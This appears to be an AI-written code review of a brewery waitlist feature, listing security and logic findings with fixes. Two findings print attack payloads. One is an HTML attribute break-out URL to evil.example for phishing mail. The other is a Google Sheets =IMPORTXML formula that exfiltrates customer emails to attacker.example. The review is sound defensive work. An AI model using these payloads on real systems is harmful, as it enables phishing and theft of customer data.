---
phase: 80-brewpad-waitlist-work-the-queue-link-customers-and-recipes-c
reviewed: 2026-09-04T00:00:00Z
depth: standard
diff_base: 8a287f5fa49a885352e967cfd2af15fb36bfd5fe
files_reviewed: 20
files_reviewed_list:
  - apps-script/adminApi.gs
  - css/brewpad.css
  - docs/APPS_SCRIPT.md
  - js/brewpad.js
  - tests/frontend/adminapi-waitlist-append-headers.test.js
  - tests/frontend/adminapi-waitlist-ensure-sheet.test.js
  - tests/frontend/adminapi-waitlist-fields.test.js
  - tests/frontend/adminapi-waitlist-pure.test.js
  - tests/frontend/brewpad-waitlist-contact.test.js
  - tests/frontend/brewpad-waitlist-customer-link.test.js
  - tests/frontend/brewpad-waitlist-manual-add.test.js
  - tests/frontend/brewpad-waitlist-position.test.js
  - tests/frontend/brewpad-waitlist-recipes.test.js
  - tests/frontend/brewpad-waitlist-render.test.js
  - zoho-middleware/__tests__/waitlist-admin-proxy.test.js
  - zoho-middleware/__tests__/waitlist-contact-mail.test.js
  - zoho-middleware/__tests__/waitlist-staff-routes.test.js
  - zoho-middleware/lib/mailer.js
  - zoho-middleware/routes/pos.js
findings:
  critical: 3
  warning: 5
  info: 4
  total: 12
status: fixed
fixes_applied: 2026-09-04
fix_outcome:
  CR-01: fixed (66daba1d)
  CR-02: fixed (2dcab6e3) — ships with the pending Apps Script redeploy
  CR-03: fixed (1c534fd4 + harness e667ca3a)
  WR-01: fixed (82e6bf6e)
  WR-02: fixed (cd731469) — ships with the pending Apps Script redeploy
  WR-03: fixed (01fcb16c)
  WR-04: fixed (99fa1cdd + 6fe0d7a1) — provisional slug, confirm in 80-CUTOVER 1a step (d)
  WR-05: partial (f9675b18) — stale status fixed; dedupe write behavior deferred, needs owner decision
  IN-01..IN-04: not attempted (Info out of default --fix scope)
post_fix_tests:
  frontend: 1643/1643 (108 suites)
  middleware: 1580/1580 (107 suites)
---

# Phase 80: Code Review Report

**Reviewed:** 2026-09-04
**Depth:** standard (diff-scoped against `8a287f5f`)
**Files Reviewed:** 20
**Status:** issues_found

## Summary

Reviewed the five plans that landed in Phase 80: the 7→13 column `Waitlist` migration in
`apps-script/adminApi.gs`, the two staff-tier middleware routes plus `sendWaitlistContact` in
`zoho-middleware/`, and the BrewPad queue/customer-link/recipe/contact/manual-add UI in
`js/brewpad.js`.

Several of the priority areas hold up under tracing and are **not** findings:

- **Authorization** is correct. Both new routes wrap their bodies in
  `authTiers.requireTiers(['legacy', 'session'])`, byte-identical to the sibling
  `/api/batch/admin-proxy` gate. `device` tier is excluded by `allowAdmin`'s tier set. Verified by
  reading `zoho-middleware/lib/authTiers.js:requireTiers`.
- **The `ADMIN_PROXY_ACTIONS` widening** is exactly one key (`add_waitlist_entry`), it is absent
  from `ADMIN_PROXY_READS`, and the pre-existing `delete payload.token` identity strip is intact
  (`zoho-middleware/routes/pos.js:4048-4053`). No broader reach.
- **Header-driven sheet writes** are genuinely name-based. `addWaitlistEntry` builds
  `new Array(ensured.headers.length)` and indexes via `ensured.col[name] - 1`, so a sheet with
  reordered or extra columns still writes correctly, and `ensureWaitlistSheet` fails closed with
  `waitlist_unavailable` on an unmigrated 7-column tab. No off-by-one. The migration-before-deploy
  ordering hazard is documented and gated in `80-CUTOVER.md` §2/§1a.
- **Secret handling** is clean on the leak axis: `grep -rn "RESEND\|CALCOM\|API_KEY" js/` returns
  only the unrelated `js/sheets-config.example.js` placeholder, and no error path in the contact
  route returns `describeError()` output to the client (only `log.error`, with generic
  `contact_failed` / `contact_write_failed` bodies).
- **The `.then(ok, err)` shape bug is genuinely fixed.** The status write is a nested
  `.then(...).catch(...)` that fully consumes its own errors, and the outer `.catch` carries a
  `res.headersSent` guard covering the residual `res.json`-throws edge. Traced; correct.
- **ES5 constraint holds.** No `const`/`let`/arrow/template-literal/spread in the added lines
  (the only backticks are inside comments). `Object.assign` at `js/brewpad.js:9277` is ES2015
  library — but it is already used in eight pre-existing places in the same file, so it is the
  project's established baseline, not a new violation.

What does not hold up is the outbound-email path. `sendWaitlistContact` was copied from
`sendBottlingInvite`, which safely leaves its `href` unescaped **because the URL is
server-constructed**. In the new function the URL is `req.body.bookingUrl` — fully client-supplied
— and the copy kept the unescaped interpolation. Combined with the route also trusting the
client's `to` and never reading the row before sending, `POST /api/waitlist/:id/contact` is an
authenticated arbitrary-mail sender on the store's verified domain. Separately, `contacted_at` is
the single new Waitlist column that bypasses `waitlistCellSafe()`, and it is client-reachable
through the admin proxy.

The three suites covering the changed middleware and the frontend render/position paths pass
(26 + 52 tests). That is not evidence of correctness here: `waitlist-contact-mail.test.js:94`
actively asserts the raw, unescaped `href` as the expected behaviour, and no test exercises
`contacted_at` sanitisation, a `booked`/`removed` row reaching the contact route, or a `to` that
differs from the row's email.

Two items were excluded per instruction and are not reported: the WR-02 optimistic-locking
carry-forward on `updateWaitlistStatus`, and the duplicated "Recipe attached" toast string.

## Critical Issues

### CR-01: Client-supplied `bookingUrl` is interpolated unescaped into the email's `href` attribute

**File:** `zoho-middleware/lib/mailer.js:438` (unescaped) vs `:444` (escaped — the asymmetry)
**Severity:** BLOCKER

**Issue:** `sendWaitlistContact` validates `bookingUrl` only for non-emptiness
(`mailer.js:427-430`), then writes it straight into an HTML attribute:

```js
'<p style="margin:24px 0;"><a href="' + bookingUrl + '" ' +
```

The plaintext echo four lines down *is* `htmlEscape`d, and the body paragraphs *are* escaped —
this one interpolation is the sole gap. It was inherited verbatim from `sendBottlingInvite`
(`mailer.js:372`), where it is safe because `bookingUrl` is built server-side from
`CALCOM_BOTTLING_BOOKING_URL` + `encodeURIComponent(...)`. Here the value arrives as
`req.body.bookingUrl` from the browser (`pos.js:4088`) with no escaping, no scheme check and no
host allowlist.

**Failure scenario (verified by execution, not inspection):**

```
POST /api/waitlist/w-1/contact   (any valid staff session)
{ "to":"victim@example.com", "subject":"s", "body":"hello",
  "bookingUrl":"https://evil.example/x\" style=\"display:none\" data-x=\"" }
```

produces:

```html
<a href="https://evil.example/x" style="display:none" data-x="" style="background:#4a6f4b;...">Book your appointment</a>
```

The injected `style` wins (first-attribute-wins), so the real CTA is invisible; arbitrary further
attributes can be injected into the anchor. Even without the quote break-out, any `https://` URL
is accepted, so a store-branded, Resend-signed, `reply-to: hello@steinsandvines.ca` phishing mail
can be sent to any address. `waitlist-contact-mail.test.js:94` pins the unescaped form as expected
behaviour, so this will not be caught by the suite.

**Fix:**

```js
var bookingUrl = (data.bookingUrl || '').trim();
if (!bookingUrl) {
  return Promise.reject(new Error('Missing booking URL'));
}
// D-06: the link must be a Cal.com booking URL — never an arbitrary staff-supplied target.
var parsed;
try { parsed = new URL(bookingUrl); } catch (e) { parsed = null; }
if (!parsed || parsed.protocol !== 'https:' ||
    !/(^|\.)cal\.com$/i.test(parsed.hostname)) {
  return Promise.reject(new Error('Invalid booking URL'));
}
...
'<p style="margin:24px 0;"><a href="' + htmlEscape(bookingUrl) + '" ' +
```

Update `waitlist-contact-mail.test.js:94` to assert the escaped form and add a case for a
break-out attempt. Apply the same `htmlEscape` to `mailer.js:372` for consistency (defence in
depth; that call site is currently safe by construction only).

---

### CR-02: `contacted_at` is the one new Waitlist column written without `waitlistCellSafe()` — formula injection

**File:** `apps-script/adminApi.gs:5297-5300`
**Severity:** BLOCKER

**Issue:** Every other field this phase added routes through `waitlistCellSafe()` — the plan even
folded 78-REVIEW's IN-01 in so that the enum-valued `status` no longer depends on "nobody ever adds
a value starting with `=+-@`" (`adminApi.gs:5262-5267`). `contacted_at` alone does not:

```js
if (hasContactedAt) {
  var contactedAtCol = headers.indexOf('contacted_at') + 1;
  sheet.getRange(result.row, contactedAtCol).setValue(payload.contacted_at);  // raw
}
```

`docs/APPS_SCRIPT.md` documents this as "Written verbatim from the caller", which reads as a
decision but is not a safe one, because `update_waitlist_status` is on `ADMIN_PROXY_ACTIONS` and
the proxy forwards the client's whole body (`pos.js:4051`, `Object.assign({}, body, {...})`). It is
therefore *not* true that only the server sets this field. There is also no format validation — the
column is documented as ISO-8601 but nothing enforces it.

**Failure scenario:** any BrewPad session-tier caller (or an XSS/hostile-extension on the BrewPad
origin) issues

```
POST /api/batch/admin-proxy
{ "action":"update_waitlist_status", "id":"<any row id>",
  "contacted_at":"=IMPORTXML(\"https://attacker.example/?d=\"&ENCODEURL(JOIN(\",\",B2:B999)),\"//x\")" }
```

Google Sheets evaluates the cell on the shared production spreadsheet and exfiltrates the entire
`email` column (every waitlist customer's address) to the attacker's host. No other field on this
handler permits this, and the `no_fields` guard is satisfied by `contacted_at` alone, so no status
change is needed to reach the write.

**Fix:**

```js
if (hasContactedAt) {
  var contactedAtCol = headers.indexOf('contacted_at') + 1;
  // Same injection guard as every other free-text write in this handler.
  sheet.getRange(result.row, contactedAtCol).setValue(waitlistCellSafe(payload.contacted_at));
}
```

Stronger (preferred, since the column has a fixed shape): validate before any `setValue`, next to
the `validatedPosition` block, and reject non-ISO values with `{ok:false, error:'invalid_contacted_at'}`:

```js
var validatedContactedAt;
if (hasContactedAt) {
  var ca = payload.contacted_at;
  if (ca === '' || ca === null || ca === undefined) {
    validatedContactedAt = '';
  } else if (typeof ca !== 'string' || !/^\d{4}-\d{2}-\d{2}T[\d:.]+Z$/.test(ca)) {
    return { ok: false, error: 'invalid_contacted_at' };
  } else {
    validatedContactedAt = ca;
  }
}
```

Update the `docs/APPS_SCRIPT.md` `contacted_at` row (it currently documents the unsafe behaviour as
intentional) and add a case to `tests/frontend/adminapi-waitlist-fields.test.js`.

---

### CR-03: The contact route sends the email before reading the row — recipient, row existence and transition are all unverified

**File:** `zoho-middleware/routes/pos.js:4082-4142`
**Severity:** BLOCKER

**Issue:** The route's only pre-send check is presence (`pos.js:4091-4093`). It never fetches the
waitlist row, so at send time it does not know whether the row exists, what its email is, or
whether it can legally advance to `contacted`. The recipient is taken verbatim from the client:

```js
var to = body.to;                     // pos.js:4086
...
mailer.sendWaitlistContact({ to: to, subject: subject, body: emailBody, bookingUrl: bookingUrl })
```

`js/brewpad.js:9036` does read `row.email` and the code comment cites T-80-28 ("`to` is read from
the row object, never the DOM"), but that is a client-side convention presented as a security
property. Nothing server-side ties `to` to `:id`.

The ordering also inverts the fail-closed intent. D-08's guarantee is "never advance on a failed
send"; the converse — "never send when the advance is impossible" — is absent. The route knows
this: `pos.js:4110-4112` has a dedicated branch for the upstream `invalid_transition` error, which
can only be reached *after* the email has already gone out.

**Failure scenario 1 (concrete, two-staff, no attacker):** Staff A removes a customer
(`status: removed`). Staff B's BrewPad tab was rendered before that and still shows the row as
`waiting` with an enabled Contact button. Staff B taps Contact and Send. The email — "Great news —
it's your turn on the beer waitlist!" — is delivered to a customer who has been removed from the
list. The Apps Script write is then correctly refused (`removed` → `contacted` fails
`waitlistTransitionAllowed`), the route returns 502 `contact_write_failed`, and the sheet still
says `removed`. Same for a `booked` row: the customer gets a second "your spot is ready" mail after
already booking.

**Failure scenario 2 (abuse):** a staff-tier credential (or CSRF/XSS on the BrewPad origin) posts
`{to: "<any address>", subject, body, bookingUrl}` against any real waitlist id. Combined with
CR-01 the result is arbitrary HTML sent from the store's Resend-verified `MAIL_FROM` with
`reply-to: hello@steinsandvines.ca`.

**Fix:** read the row first, derive `to` from it, and refuse the send when the transition is not
allowed. The Apps Script side already has both the data and the predicate — add a
`get_waitlist`-style lookup (or a new `get_waitlist_row` read action) and gate on it:

```js
// Pre-flight: the row must exist AND be advanceable BEFORE anything is sent (D-07/D-08).
axios.get(process.env.APPS_SCRIPT_URL, {
  params: { action: 'get_waitlist', server_token: process.env.APPS_SCRIPT_SERVER_TOKEN },
  timeout: 15000, maxRedirects: 5
}).then(function (resp) {
  var rows = (resp && resp.data && resp.data.data) || [];
  var row = null;
  for (var i = 0; i < rows.length; i++) if (String(rows[i].id) === String(id)) { row = rows[i]; break; }
  if (!row) return res.status(404).json({ ok: false, error: 'not_found' });
  if (row.status === 'booked' || row.status === 'removed') {
    return res.status(409).json({ ok: false, error: 'invalid_transition' });
  }
  // Recipient is the ROW's email — never the client's.
  return mailer.sendWaitlistContact({ to: row.email, subject: subject, body: emailBody, bookingUrl: bookingUrl })
    .then(...)                       // existing send-then-write chain, unchanged
});
```

Then drop `to` from the accepted request body (or keep it and reject when it does not match
`row.email`). Add middleware tests for: booked row → no send; removed row → no send; `to` differing
from the row's email → no send.

## Warnings

### WR-01: On `contact_write_failed` the UI says "do not re-send" and immediately re-enables the Send button

**File:** `js/brewpad.js:9015-9024`
**Issue:** The catch handler runs `sendBtn.disabled = false;` unconditionally, then — only when
`err.writeFailed` — appends "The email went out, but the row was not advanced — do not re-send."
The sheet stays open with an active Send button one tap away. In exactly the state where the phase
knows a duplicate must not be sent, the UI leaves duplicate-sending as the most obvious next
action. This is the "no path sends twice" half of D-07/D-08 leaking through the UI.
**Fix:**
```js
.catch(function (err) {
  var writeFailed = !!(err && err.writeFailed);
  // The email HAS gone out — never re-arm Send, only Cancel.
  sendBtn.disabled = writeFailed;
  if (errEl) {
    var msg = writeFailed
      ? 'The email went out, but the row was not advanced. Close this and set the status manually — do not re-send.'
      : 'Could not send. Please try again.';
    errEl.textContent = msg;
    errEl.style.display = '';
  }
});
```

---

### WR-02: The reinstate path leaves a stale `position` pin and stale `contacted_at` on a re-signing customer

**File:** `apps-script/adminApi.gs:5082-5087`
**Issue:** When a `removed` row is reinstated, only `status` and `signed_up_at` are rewritten. The
comment two lines above states the intent: "so they land at the back of the queue". With the new
`position` column that is no longer what happens — `sortWaitlistRows` merge-inserts on `position`
irrespective of `signed_up_at`, so a customer who was pinned to slot 2, then removed, then signs up
again is put straight back at slot 2, ahead of everyone who has been waiting since. `contacted_at`
is likewise retained, so a freshly-`waiting` row carries a timestamp claiming it was already
contacted. This is a Phase-80 regression: the reinstate path predates the phase, but the two
columns that break it do not.
**Failure scenario:** row pinned to `position = 1`, then removed. Customer re-submits the public
`beer.html` form. `addWaitlistEntry` reinstates → `status: waiting`, fresh `signed_up_at`,
`position` still `1`. BrewPad renders them at the head of the queue with `📌 1`.
**Fix:**
```js
if (waitlistShouldReinstate(decision.row)) {
  ensured.sheet.getRange(decision.row._row, ensured.col.status).setValue('waiting');
  ensured.sheet.getRange(decision.row._row, ensured.col.signed_up_at)
    .setValue(new Date().toISOString());
  // D-11: a reinstated signup is never pinned and has not been contacted since.
  ensured.sheet.getRange(decision.row._row, ensured.col.position).setValue('');
  ensured.sheet.getRange(decision.row._row, ensured.col.contacted_at).setValue('');
  invalidateSheetCache(WAITLIST_SHEET_NAME);
}
```

---

### WR-03: `/api/waitlist/:id/mailerlite-sync` validates neither `email` nor `id`

**File:** `zoho-middleware/routes/pos.js:4143-4170`
**Issue:** `var email = (req.body && req.body.email) || '';` is passed straight to
`mailerlite.addSubscriber(email, ...)` with no format check, and `id` is passed straight into the
`update_waitlist_status` write. Nothing correlates the two — the route will happily subscribe an
arbitrary address to the beer-waitlist group while stamping `mailerlite_synced: true` onto an
unrelated row. Because the route is fire-and-forget and always answers `{ok:true}` (D-24), every
failure mode here is silent to both the caller and the operator except for one `log.error` line.
An empty `email` (the frontend does not guarantee one) produces a MailerLite API error that is
caught, logged and discarded, and the row's sync flag is never set — indistinguishable from success
at the HTTP layer.
**Fix:** validate `email` against the same regex the rest of the phase uses, and return 400 on
failure before dispatching (the D-24 fire-and-forget contract covers the MailerLite *outcome*, not
malformed input):
```js
var email = ((req.body && req.body.email) || '').trim();
if (!id || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
  return res.status(400).json({ ok: false, error: 'invalid_request' });
}
```
Better still, derive `email` from the row for the same reason as CR-03.

---

### WR-04: The Contact sheet resolves the booking link by array position, with no runtime guard

**File:** `js/brewpad.js:8949`
**Issue:** `var svc = result.ok && result.data.services && result.data.services[0];` takes
whichever event type `bookings.js` happens to list first. `80-CUTOVER.md` §1a documents this
thoroughly and blocks UAT leg 7 on it — but the fragile code is merged on `main` with no guard, so
if anyone enables the flow before the prerequisite lands (or if the env-var ordering in
`bookings.js` ever changes), every waitlist customer silently receives a *ferment-kit* or
*bottling* booking link and nothing fails loudly. The failure is invisible at every layer: the
route accepts any non-empty URL (CR-01), and the sheet's preview shows the wrong link as if it were
right.
**Fix:** select explicitly rather than positionally, and fail closed when the intended service is
absent — this is the guard that makes the §1a prerequisite enforceable rather than procedural:
```js
var services = (result.ok && result.data.services) || [];
var svc = null;
for (var i = 0; i < services.length; i++) {
  if (services[i] && services[i].slug === WAITLIST_BOOKING_SLUG) { svc = services[i]; break; }
}
var bookingUrl = svc && svc.bookingUrl;   // falsy -> existing "Could not prepare the booking link"
```

---

### WR-05: Manual-add silently discards the typed name/phone/recipes on a dedupe hit, and shows a status the write has already changed

**File:** `js/brewpad.js:9262-9266` and `js/brewpad.js:9309-9316`
**Issue:** Two problems on the same branch.

1. When the disclosure fires, `showWaitlistAddDisclosure` returns `null` and the
   `optionalUpdates` block (`:9268-9276`) is never reached. Whatever the staff member typed into
   Name, Phone and Recipes is thrown away with no mention of it. The disclosure text only says the
   customer is already on the list — a reasonable reader concludes the details were merged.
2. The disclosure prints `existingRow.status` from the **pre-write snapshot**, but by then
   `addWaitlistEntry` has already run. If the matched row was `removed`, it has just been
   reinstated to `waiting` server-side (`adminApi.gs:5082`). The sheet says "currently Removed"
   while the row is now Waiting. The code comment justifies using the pre-write `signed_up_at`
   (correct — the post-write value is refreshed); it extends that reasoning to `status`, where it
   does not hold.

**Fix:** apply the optional fields to the matched row rather than dropping them (they are
per-row metadata, not queue-position data — writing them is not a D-06 disclosure concern), and
state the outcome plainly:
```js
if (Object.prototype.hasOwnProperty.call(existingById, String(newId))) {
  showWaitlistAddDisclosure(email, existingById[String(newId)], closeAddSheet);
  submitBtn.disabled = false;
  return null;   // <- if fields are still intentionally dropped, say so in the sheet body:
                 //    "…already on the list. The name, phone and recipes you entered were not saved."
}
```
and drop `currently {status}` from the disclosure copy, or re-read the row before rendering it.

## Info

### IN-01: `position` accepts unbounded values such as `1e21`

**File:** `apps-script/adminApi.gs:5242-5247`
**Issue:** `Number('1e21')` is finite, `Math.floor` equal and `>= 1`, so it passes validation and is
stored. `parseWaitlistPosition` then reads it back as a number, the merge-insert clamps to the tail,
and the row renders `📌 1e+21`. Harmless but nonsensical, and it makes the pin permanently
unreachable by the intended "type the rank you want" interaction.
**Fix:** add an upper bound alongside the existing checks, e.g. `|| posNum > 10000` →
`invalid_position`.

### IN-02: `updateWaitlistStatus` re-reads the header row instead of reusing `ensured.col`

**File:** `apps-script/adminApi.gs:5259-5260`
**Issue:** `ensureWaitlistSheet()` at `:5206` already returned a validated `col` map, yet the
handler performs a second `getRange(1, 1, 1, getLastColumn()).getValues()` and re-derives every
index with `headers.indexOf(name) + 1` — nine times. Two sources of truth for the same lookup, in
the exact handler whose sibling (`addWaitlistEntry`) carries a prominent RESEARCH.md Pitfall-1
comment about doing this by name once. Not a bug today (both paths are name-based), but it is the
seam a future positional shortcut would slip through.
**Fix:** delete lines 5259-5260 and use `ensured.col.status`, `ensured.col.notes`, … throughout,
with `var sheet = ensured.sheet;` retained.

### IN-03: The recipe catalog cache is poisoned with synthetic entries and never refreshed

**File:** `js/brewpad.js:8874`
**Issue:** After a successful attach, `_waitlistRecipeCatalog.push({ recipe_id: rid, name: rname })`
inserts an entry with no `style` field. `showWaitlistRecipeOptions` filters on
`(r.name || '') + ' ' + (r.style || '')`, so that recipe becomes unsearchable by style for the rest
of the session. The cache is also never invalidated, so a recipe renamed or archived mid-session
keeps resolving to the stale name in `waitlistResolveRecipeName`. Also `_waitlistLinkSearchTimer`
(`:8612`) is a single module-scoped timer shared by every row's customer-link panel — only one
panel is realistically open at a time, but nothing enforces that.
**Fix:** the push is only needed so the chip renders a name before the next fetch; drop it and let
`waitlistResolveRecipeName` fall back to the id, or store the whole option object including
`style`.

### IN-04: The device-tier rejection test accepts either 401 or 403

**File:** `zoho-middleware/__tests__/waitlist-staff-routes.test.js:184`
**Issue:** `expect([401, 403]).toContain(res._status)` in the test that pins "staff-only, device
explicitly excluded". This is the single assertion standing between a device token and the
contact-send route, and it is written loosely enough that a future refactor changing the guard's
semantics (e.g. falling through to a different middleware that happens to 401) would still pass.
The sibling `no credential` test on the same route asserts `toBe(401)` exactly.
**Fix:** assert the actual value — `requireTiers` returns 403 for a resolved-but-disallowed tier —
`expect(res._status).toBe(403);`.

---

_Reviewed: 2026-09-04_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
